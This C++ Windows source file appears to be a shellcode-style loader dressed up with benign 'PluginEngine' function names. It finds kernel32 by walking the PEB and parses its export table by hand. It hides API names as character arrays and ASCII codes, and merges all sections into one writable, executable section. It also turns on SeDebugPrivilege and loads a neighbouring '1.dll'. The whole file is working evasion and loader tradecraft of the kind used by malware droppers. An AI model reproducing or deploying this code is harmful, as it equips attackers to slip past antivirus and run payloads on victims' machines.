/*
7z e shellcode.bin.exe >>shellcode.bin
*/
#include <Windows.h>
#include <Winternl.h>

#pragma comment(linker,"/ENTRY:wWinMain")
#ifndef _DEBUG
#pragma comment(linker,"/ALIGN:512")
#pragma comment(linker,"/FILEALIGN:512")
#pragma comment(linker,"/opt:nowin98")
#pragma comment(linker,"/opt:ref")
#pragma comment(linker,"/OPT:ICF")
#pragma comment(linker, "/SECTION:.text,ERW")
#pragma comment(linker,"/MERGE:.rdata=.text")
#pragma comment(linker,"/MERGE:.data=.text")
#pragma comment(linker,"/MERGE:.bss=.text")
#endif
//////////////////////////////////////////////////////////////////////////
typedef FARPROC(WINAPI* GetProcAddressTY)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryWTY)(LPCWSTR);
//////////////////////////////////////////////////////////////////////////
void InitPluginEngine(HMODULE hModule);
HMODULE LoadPluginEngine(HMODULE hModule, const wchar_t* name);
void ExitPluginEngine(HMODULE hModule);
//////////////////////////////////////////////////////////////////////////
INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nShowCmd){
  HMODULE ldr = nullptr;
  InitPluginEngine(hInstance);
  wchar_t sss[] = { '/', '1', '.', 'd', 'l', 'l', '\0'};
  ldr = LoadPluginEngine(hInstance, sss);
  ExitPluginEngine(ldr);
  return 0;
}

namespace Function{
  inline BOOL __ISUPPER__(__in CHAR c) {
    return ('A' <= c) && (c <= 'Z');
  };

  inline CHAR __TOLOWER__(__in CHAR c) {
    return __ISUPPER__(c) ? c - 'A' + 'a' : c;
};

  static UINT __STRLEN__(__in LPSTR lpStr1)
  {
    UINT i = 0;
    while (lpStr1[i] != 0x0)
      i++;

    return i;
  }

  static UINT __STRLENW__(__in LPWSTR lpStr1)
  {
    UINT i = 0;
    while (lpStr1[i] != L'\0')
      i++;

    return i;
  }

  static INT __STRNCMPI__(
    __in LPSTR lpStr1,
    __in LPSTR lpStr2,
    __in DWORD dwLen)
  {
    int  v;
    CHAR c1, c2;
    do
    {
      dwLen--;
      c1 = *lpStr1++;
      c2 = *lpStr2++;
      /* The casts are necessary when pStr1 is shorter & char is signed */
      v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
    } while ((v == 0) && (c1 != '\0') && (c2 != '\0') && dwLen > 0);
    return v;
  }

  static LPSTR __STRSTRI__(__in LPSTR lpStr1, __in LPSTR lpStr2)
  {
    CHAR c = __TOLOWER__((lpStr2++)[0]);
    if (!c)
      return lpStr1;

    UINT dwLen = __STRLEN__(lpStr2);
    do
    {
      CHAR sc;
      do
      {
        sc = __TOLOWER__((lpStr1++)[0]);
        if (!sc)
          return NULL;
      } while (sc != c);
    } while (__STRNCMPI__(lpStr1, lpStr2, dwLen) != 0);

    return (lpStr1 - 1); // FIXME: -0?
  }

  static INT __STRNCMPIW__(
    __in LPWSTR lpStr1,
    __in LPWSTR lpStr2,
    __in DWORD dwLen)
  {
    int  v;
    CHAR c1, c2;
    do {
      dwLen--;
      c1 = ((PCHAR)lpStr1++)[0];
      c2 = ((PCHAR)lpStr2++)[0];
      /* The casts are necessary when pStr1 is shorter & char is signed */
      v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
    } while ((v == 0) && (c1 != 0x0) && (c2 != 0x0) && dwLen > 0);

    return v;
  }

  static LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)
  {
    CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);
    if (!c)
      return lpStr1;

    UINT dwLen = __STRLENW__(lpStr2);
    do
    {
      CHAR sc;
      do
      {
        sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);
        if (!sc)
          return NULL;
      } while (sc != c);
    } while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);

    return (lpStr1 - 1); // FIXME -2 ?
  }

  static INT __STRCMPI__(
    __in LPSTR lpStr1,
    __in LPSTR lpStr2)
  {
    int  v;
    CHAR c1, c2;
    do
    {
      c1 = *lpStr1++;
      c2 = *lpStr2++;
      // The casts are necessary when pStr1 is shorter & char is signed 
      v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
    } while ((v == 0) && (c1 != '\0') && (c2 != '\0'));
    return v;
  }

  static LPSTR __STRCAT__(
    __in LPSTR	strDest,
    __in LPSTR strSource)
  {
    LPSTR d = strDest;
    LPSTR s = strSource;

    while (*d) d++;

    do { *d++ = *s++; } while (*s);
    *d = 0x0;

    return strDest;
  }


  static LPWSTR __STRCATW__(
    __in LPWSTR	strDest,
    __in LPWSTR strSource)
  {
    LPWSTR d = strDest;
    LPWSTR s = strSource;

    while (*d != L'\0') d++;
    do { *d++ = *s++; } while (*s != L'\0');
    *d = L'\0';

    return strDest;
  }

  static LPVOID __MEMCPY__(
    __in LPVOID lpDst,
    __in LPVOID lpSrc,
    __in DWORD dwCount)
  {
    LPBYTE s = (LPBYTE)lpSrc;
    LPBYTE d = (LPBYTE)lpDst;

    while (dwCount--)
      *d++ = *s++;

    return lpDst;
  }
#pragma optimize( "", off ) 
  static VOID __MEMSET__(__in LPVOID p, __in CHAR cValue, __in DWORD dwSize)
  {
    for (UINT i = 0; i < dwSize; i++)
      ((PCHAR)p)[i] = cValue;
  }
#pragma optimize( "", off )
	static HANDLE GetKernel32Handle(){
		HANDLE hKernel32 = INVALID_HANDLE_VALUE;
#ifdef _WIN64
		PPEB lpPeb = (PPEB)__readgsqword(0x60);
#else
		PPEB lpPeb = (PPEB)__readfsdword(0x30);
#endif
		PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
		PLIST_ENTRY pListEntry = pListHead->Flink;
		WCHAR strDllName[MAX_PATH];
		WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };

		while (pListEntry != pListHead){
			PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			if (pModEntry->FullDllName.Length){
				DWORD dwLen = pModEntry->FullDllName.Length;
				__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);
				strDllName[dwLen / sizeof(WCHAR)] = L'\0';
				if (__STRSTRIW__(strDllName, strKernel32)){
					hKernel32 = pModEntry->DllBase;
					break;
				}
			}
			pListEntry = pListEntry->Flink;
		}
		return hKernel32;
	}

  static BOOL Initialize(GetProcAddressTY* GetProcAddressAPI, LoadLibraryWTY* LoadLibraryWAPI){
		HANDLE hKernel32 = GetKernel32Handle();
		if (hKernel32 == INVALID_HANDLE_VALUE){
			return FALSE;
		}
		LPBYTE lpBaseAddr = (LPBYTE)hKernel32;
		PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;
		PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfNames);
		LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfFunctions);
		LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir->AddressOfNameOrdinals);
		CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };
		CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

		for (UINT i = 0; i < pExportDir->NumberOfNames; i++){
			LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
			if (!__STRCMPI__(pFuncName, strGetProcAddress)){
				*GetProcAddressAPI = (FARPROC(WINAPI*)(HMODULE, LPCSTR))(lpBaseAddr + pAddrArray[pOrdArray[i]]);
			}
			else if (!__STRCMPI__(pFuncName, strLoadLibraryA)){
				*LoadLibraryWAPI = (HMODULE(WINAPI*)(LPCWSTR))(lpBaseAddr + pAddrArray[pOrdArray[i]]);
			}
			if (*GetProcAddressAPI != nullptr && *LoadLibraryWAPI != nullptr){
				return TRUE;
			}
		}
		return FALSE;
	}
  static FARPROC GetAddress(const char* function_name){
    FARPROC(WINAPI* GetProcAddressAPI)(HMODULE,LPCSTR) = nullptr;
    HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR) = nullptr;
    Function::Initialize(&GetProcAddressAPI, &LoadLibraryWAPI);
#ifdef OS_WIN_64
		PPEB lpPeb = (PPEB)__readgsqword(0x60);
#else
		PPEB lpPeb = (PPEB)__readfsdword(0x30);
#endif
		PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
		PLIST_ENTRY pListEntry = pListHead->Flink;
		while (pListEntry != pListHead){
			PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			if (pModEntry->FullDllName.Length){
				FARPROC address = GetProcAddressAPI(LoadLibraryWAPI(pModEntry->FullDllName.Buffer), function_name);
				if (address){
					return address;
				}
			}
			pListEntry = pListEntry->Flink;
		}
		return nullptr;
	}
  static bool ImportDll(){
    FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR) = nullptr;
    HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR) = nullptr;
    Function::Initialize(&GetProcAddressAPI, &LoadLibraryWAPI);
		using OLE_INITIALIZE = HRESULT(WINAPI*)(LPVOID);
		wchar_t dll_ole32[] = { L'O', L'l', L'e', L'3', L'2', L'.', L'd', L'l', L'l', 0 };
		char dll_ole32_api[] = { 'O', 'l', 'e', 'I', 'n', 'i', 't', 'i', 'a', 'l', 'i', 'z', 'e', 0 };
		OLE_INITIALIZE ole_initialize = reinterpret_cast<OLE_INITIALIZE>(GetProcAddressAPI(LoadLibraryWAPI(dll_ole32), dll_ole32_api));
		using INIT_COMMON_CONTROLS_EX = void (WINAPI*)(const void*);
		wchar_t dll_comctl32[] = { L'C', L'o', L'm', L'c', L't', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0 };
		char dll_comctl32_api[] = { 'I', 'n', 'i', 't', 'C', 'o', 'm', 'm', 'o', 'n', 'C', 'o', 'n', 't', 'r', 'o', 'l', 's', 'E', 'x', 0 };
		INIT_COMMON_CONTROLS_EX init_common_controls_ex = reinterpret_cast<INIT_COMMON_CONTROLS_EX>(GetProcAddressAPI(LoadLibraryWAPI(dll_comctl32), dll_comctl32_api));
		if (ole_initialize == nullptr || init_common_controls_ex == nullptr){
			return false;
		}
		init_common_controls_ex(nullptr);
		return (ole_initialize(nullptr) == S_OK);
	}
}
void InitPluginEngine(HMODULE hModule){
  Function::ImportDll();
  BOOL(WINAPI *DisableThreadLibraryCallsAPI)(HMODULE) = nullptr;
  ULONG(WINAPI *RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN) = nullptr;
  if (DisableThreadLibraryCallsAPI == nullptr){
    //reference:http://onlinecalculators.brainmeasures.com/Conversions/StringtoAsciiCalculator.aspx
    char sss[] = { 68, 105, 115, 97, 98, 108, 101, 84, 104, 114, 101, 97, 100, 76, 105, 98, 114, 97, 114, 121, 67, 97, 108, 108, 115, 00};
    DisableThreadLibraryCallsAPI = (BOOL(WINAPI*)(HMODULE))Function::GetAddress(sss);
    DisableThreadLibraryCallsAPI(hModule);
  }
  if (RtlAdjustPrivilege == nullptr){
    BOOLEAN enabled_privilege = 0;
    const DWORD SE_DEBUG_PRIVILEGE = 0x14;
    char sss[] = { 82, 116, 108, 65, 100, 106, 117, 115, 116, 80, 114, 105, 118, 105, 108, 101, 103, 101, 00 };
    RtlAdjustPrivilege = (ULONG(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))Function::GetAddress(sss);
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &enabled_privilege);
  }
}
HMODULE LoadPluginEngine(HMODULE hModule, const wchar_t* name){
  FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR) = nullptr;
  HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR) = nullptr;
  Function::Initialize(&GetProcAddressAPI, &LoadLibraryWAPI);
  DWORD(WINAPI* GetModuleFileNameWAPI)(HMODULE, LPWSTR, DWORD);
  char sss1[] = { 71, 101, 116, 77, 111, 100, 117, 108, 101, 70, 105, 108, 101, 78, 97, 109, 101, 87, 00 };
  GetModuleFileNameWAPI = (DWORD(WINAPI*)(HMODULE, LPWSTR, DWORD))Function::GetAddress(sss1);
  HRESULT(STDAPICALLTYPE* PathRemoveFileSpecWPI)(LPWSTR);
  char sss2[] = { 80, 97, 116, 104, 82, 101, 109, 111, 118, 101, 70, 105, 108, 101, 83, 112, 101, 99, 87, 00 };
  PathRemoveFileSpecWPI = (HRESULT(STDAPICALLTYPE*)(LPWSTR))Function::GetAddress(sss2);
  if (GetModuleFileNameWAPI != nullptr&&PathRemoveFileSpecWPI != nullptr){
    wchar_t fileName[MAX_PATH];
    GetModuleFileNameWAPI(hModule, fileName, MAX_PATH);
    PathRemoveFileSpecWPI(fileName);
    Function::__STRCATW__(fileName, (LPWSTR)name);
    return LoadLibraryWAPI(fileName);
  }
  return nullptr;
}
void ExitPluginEngine(HMODULE hModule){
  BOOL(WINAPI* FreeLibraryAPI)(HMODULE) = nullptr;
  if (FreeLibraryAPI == nullptr){
    char sss[] = { 70, 114, 101, 101, 76, 105, 98, 114, 97, 114, 121, 00 };
    FreeLibraryAPI = (BOOL(WINAPI*)(HMODULE))Function::GetAddress(sss);
    FreeLibraryAPI(hModule);
  }
}